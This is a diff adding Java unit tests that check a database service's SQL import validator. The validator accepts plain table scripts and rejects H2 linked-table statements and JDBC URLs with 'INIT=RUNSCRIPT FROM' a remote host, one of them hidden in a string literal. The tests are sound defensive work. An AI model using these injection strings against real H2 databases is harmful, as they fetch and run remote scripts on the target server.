@@ -263,4 +263,58 @@ class DatabaseServiceTest {
         boolean result = databaseService.importDatabaseFromUI(script);
         assertThat(result).isTrue();
     }
+
+    @Test
+    void validateSqlContentAcceptsPlainCreateAndInsert() throws IOException {
+        Path script =
+                writeScript(
+                        "CREATE TABLE T(ID INT, NAME CHARACTER VARYING(255));\n"
+                                + "INSERT INTO T(ID, NAME) VALUES(1, 'Default team');\n");
+
+        assertThat(databaseService.importDatabaseFromUI(script)).isTrue();
+    }
+
+    @Test
+    void validateSqlContentRejectsTemporaryLinkedTable() throws IOException {
+        Path script =
+                writeScript(
+                        "CREATE GLOBAL TEMPORARY LINKED TABLE X('org.h2.Driver',"
+                                + "'jdbc:h2:mem:p;INIT=RUNSCRIPT FROM ''http://a/x.sql''',"
+                                + "'sa','sa','T');");
+
+        assertThatThrownBy(() -> databaseService.importDatabaseFromUI(script))
+                .isInstanceOf(IllegalArgumentException.class)
+                .hasMessageContaining("disallowed operations");
+    }
+
+    @Test
+    void validateSqlContentRejectsForceLinkedTable() throws IOException {
+        Path script =
+                writeScript(
+                        "CREATE FORCE LINKED TABLE X('org.h2.Driver',"
+                                + "'jdbc:h2:mem:p','sa','sa','T');");
+
+        assertThatThrownBy(() -> databaseService.importDatabaseFromUI(script))
+                .isInstanceOf(IllegalArgumentException.class)
+                .hasMessageContaining("disallowed operations");
+    }
+
+    @Test
+    void validateSqlContentRejectsInitRunscriptHiddenInStringLiteral() throws IOException {
+        Path script =
+                writeScript(
+                        "CREATE TABLE T(ID INT, URL CHARACTER VARYING(255));\n"
+                                + "INSERT INTO T(ID, URL) VALUES(1,"
+                                + " 'jdbc:h2:mem:p;INIT=RUNSCRIPT FROM ''http://a/x.sql''');");
+
+        assertThatThrownBy(() -> databaseService.importDatabaseFromUI(script))
+                .isInstanceOf(IllegalArgumentException.class)
+                .hasMessageContaining("disallowed operations");
+    }
+
+    private Path writeScript(String sqlContent) throws IOException {
+        Path script = Files.createTempFile("backup", ".sql");
+        Files.writeString(script, sqlContent);
+        return script;
+    }
 }
